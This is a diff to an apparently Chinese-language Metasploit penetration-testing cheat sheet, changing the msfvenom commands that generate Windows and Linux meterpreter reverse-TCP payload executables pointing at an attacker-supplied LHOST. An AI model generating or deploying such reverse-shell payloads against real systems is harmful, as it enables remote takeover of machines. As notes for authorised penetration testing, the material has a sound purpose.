@@ -21,8 +21,8 @@ msfdb init   # 初始化数据库
 ## Msfvenom
 
 ```sh
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[ip] -f exe -o ~/payload.exe
-msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=[ip] -f elf -o ~/payload
+msfvenom -p windows/x64/meterpreter/reverse_tcp_rc4 LHOST=[ip] -f exe -o ~/payload.exe
+msfvenom -p linux/x64/meterpreter/reverse_tcp       LHOST=[ip] -f elf -o ~/payload
 ```
 
 ## 后渗透测试
